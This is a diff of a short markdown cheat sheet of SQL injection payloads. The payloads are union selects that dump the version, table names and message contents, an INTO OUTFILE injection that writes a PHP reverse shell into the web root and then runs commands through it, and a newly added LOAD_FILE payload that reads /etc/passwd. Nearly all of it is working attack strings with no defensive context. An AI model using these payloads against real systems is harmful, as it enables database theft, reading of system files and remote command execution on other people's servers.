@@ -1,15 +1,21 @@
 # uploading File with Mysql
 
 Basic:
-```<VALUE>' union select 1, @@version-- -```
-```<VALUE>' union select 1, table_name FROM information_schema.tables-- -```
+```
+<VALUE>' union select 1, @@version-- -
+```
+```
+<VALUE>' union select 1, table_name FROM information_schema.tables-- -
+```
 
-uploading:
-```<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#```
+> uploading:
+```
+<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#
+```
 
 > then go to http://example.com/shell.php?cmd=`<exec>`
 
-#List For Extract Data
+# List For Extract Data
 
 1: 
 ```
@@ -22,4 +28,9 @@ uploading:
 3: 
 ```
 12 union select 1,group_concat(message_content),3,4 from messages    
+```
+# read files
+1: 
+```
+'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
 ```
